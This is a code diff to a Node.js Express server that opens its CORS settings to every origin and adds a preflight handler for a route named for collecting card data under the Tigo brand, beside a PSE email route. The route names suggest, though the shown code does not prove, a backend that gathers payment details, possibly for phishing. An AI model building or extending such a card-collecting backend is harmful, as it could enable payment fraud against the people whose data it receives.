@@ -9,16 +9,33 @@ const cors = require('cors');
 const FormData = require('form-data');
 const app = express();
 
-// ========== CONFIGURACIÓN CORS ==========
+// ========== CONFIGURACIÓN CORS MEJORADA ==========
 const corsOptions = {
   origin: '*', 
-  methods: ['GET', 'POST', 'OPTIONS'],
-  allowedHeaders: ['Content-Type', 'Authorization'],
-  credentials: false
+  methods: ['GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'],
+  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept'],
+  credentials: false,
+  preflightContinue: false,
+  optionsSuccessStatus: 204
 };
 
 app.use(cors(corsOptions));
 app.options('*', cors(corsOptions));
+
+// Middleware adicional para asegurar headers CORS
+app.use((req, res, next) => {
+  res.header('Access-Control-Allow-Origin', '*');
+  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
+  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With, Accept');
+  
+  // Manejar preflight
+  if (req.method === 'OPTIONS') {
+    return res.sendStatus(204);
+  }
+  
+  next();
+});
+
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 
@@ -1269,6 +1286,9 @@ app.post('/tigo/pse-correo', async (req, res) => {
 // ============================================================================
 // 🏦 SECCIÓN TIGO - RUTA DE TARJETAS CON DETECCIÓN DE ENTIDADES
 // ============================================================================
+
+// Preflight para /tigo/tarjeta
+app.options('/tigo/tarjeta', cors());
 
 app.post('/tigo/tarjeta', async (req, res) => {
   try {
